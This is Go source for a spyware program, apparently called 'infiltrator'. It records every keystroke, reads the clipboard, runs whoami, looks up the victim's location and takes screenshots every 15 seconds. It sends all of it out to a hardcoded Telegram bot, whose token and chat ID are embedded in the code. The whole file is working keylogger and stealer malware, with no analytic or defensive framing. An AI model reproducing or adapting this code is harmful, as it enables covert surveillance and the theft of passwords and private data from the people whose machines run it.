package main

import (
	"fmt"
	"infiltrator/modules"
	"io"
	"log"
	"net/http"
	"net/url"
	"os/exec"
	"time"

	"github.com/atotto/clipboard"
	"github.com/eiannone/keyboard"
)

var logs string

const (
	botToken = "7849597289:AAHvJUiZU8PkorT_cqqyky926hiFYoA88OA"
	ChatID   = "1859109698"
)

func main() {
	sendM(localisation())
	version := system("whoami")
	sendM(version)
	sendM(StartClipboardMonitor())
	sendScreen()
	err := keyboard.Open() // ouvrir le clavier
	if err != nil {
		log.Fatal(err)
	}
	defer keyboard.Close()

	go func() {
		for {
			time.Sleep(15 * time.Second)
			sendScreen()
			if logs != "" {
				keyentr := fmt.Sprintf("[Keyboard Entries] %s", logs)
				sendM(keyentr)
				logs = ""
			}
		}
	}()

	for {
		char, _, err := keyboard.GetKey() // fonction principale
		if err != nil {
			log.Fatal(err)
		}
		logs += string(char)
	}
}

func sendM(message string) {
	apiURL := fmt.Sprintf(
		"https://api.telegram.org/bot%s/sendMessage?chat_id=%s&text=%s",
		botToken, ChatID, url.QueryEscape(message),
	)

	_, err := http.Get(apiURL)
	if err != nil {
		return
	}
}

func localisation() string {
	resp, err := http.Get("https://ipinfo.io/")
	if err != nil {
		log.Fatal(err)
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(resp.Body)
	return string(body)
}

func system(cmdstr string) string {
	cmd := exec.Command(cmdstr)
	out, err := cmd.CombinedOutput()
	if err != nil {
		log.Fatal(err)
	}
	output := fmt.Sprintf("[whoami] %s", out)
	return string(output)
}

func StartClipboardMonitor() string {
	clipboard, err := clipboard.ReadAll()
	if err != nil {
		log.Fatal(err)
	}
	clip := fmt.Sprintf("[Clipboard] %s", clipboard)
	return string(clip)
}

func sendScreen() error {
	files, err := modules.Screen()
	if err != nil {
		log.Fatal(err)
	}
	for _, f := range files {
		err := modules.SendTG(botToken, ChatID, f)
		if err != nil {
			log.Fatal(err)
		}
	}
	return nil
}
